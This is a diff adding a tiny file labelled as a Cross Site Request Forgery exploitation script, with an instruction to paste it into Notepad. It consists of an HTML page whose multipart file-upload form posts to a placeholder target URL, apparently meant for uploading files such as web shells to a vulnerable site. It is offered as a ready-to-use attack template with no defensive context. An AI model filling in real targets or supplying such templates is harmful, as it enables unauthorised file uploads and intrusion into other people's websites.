@@ -1,0 +1,17 @@
+# CSRFScript
+Exploitation Cross Site Request Forgery
+(Copy and paste in Your Notepad)
+
+<html>
+<center>
+	<h1>CSRF</h1>
+</center>
+<body>
+	<center>
+<form action="URL NYA" method="POST" enctype="multipart/form-data" >
+<input type="file" name="file" />
+<input type="submit" value="Submit"/>
+</form>
+</center>
+</body>
+</html>
